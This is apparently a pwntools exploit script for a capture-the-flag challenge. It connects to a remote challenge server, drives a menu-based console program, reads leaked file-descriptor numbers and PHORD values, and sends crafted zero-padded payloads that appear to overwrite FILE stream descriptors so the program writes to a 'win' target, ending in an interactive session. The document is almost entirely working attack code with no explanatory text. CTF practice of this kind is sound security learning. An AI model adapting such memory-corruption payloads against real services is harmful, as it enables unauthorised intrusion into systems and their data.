from pwn import *

# context.log_level = "debug"
# r = gdb.debug("./f1_console",gdbscript="""
# c
# p *(FILE *) in_stream
# p *(FILE *) out_stream

# """)
r = remote("challenge.stdio.2600.in.th", 32696)
def send(s):
    r.sendline(s)
def wait_console():
    r.recvuntil(b"[5]")

wait_console()
send(b"4\n4")

r.recvuntil(b"PHORD=")
PHORD = r.read(14) #hex str
r.recvuntil("fd_phord=")
fd_phord = int(r.read(1))
r.recvuntil("fd_winner=")
fd_winner = int(r.read(1))

info(f"""
fd_phrod : {fd_phord}
fd_winner : {fd_winner}
PHORD : {PHORD}
""")
print("boopbip boopbip... 🤔")


payload = p64(0)*13+p64(0) #0x74
payload += p32(fd_phord)
payload2 = p64(0)*13+p64(0) #0x74
payload2 += p32(fd_winner)
# payload += b"\x00"*(0x74-len(payload)-1)
wait_console()
send(b"1")
r.send(payload)
wait_console()
send(b"2")
r.send(payload2)
# wait_console()
send(b"5")
wait_console()
send(b"0")
wait_console()
send(b"2")
send(b"50")
wait_console()
send(b"1") #write to /win
wait_console()
r.interactive()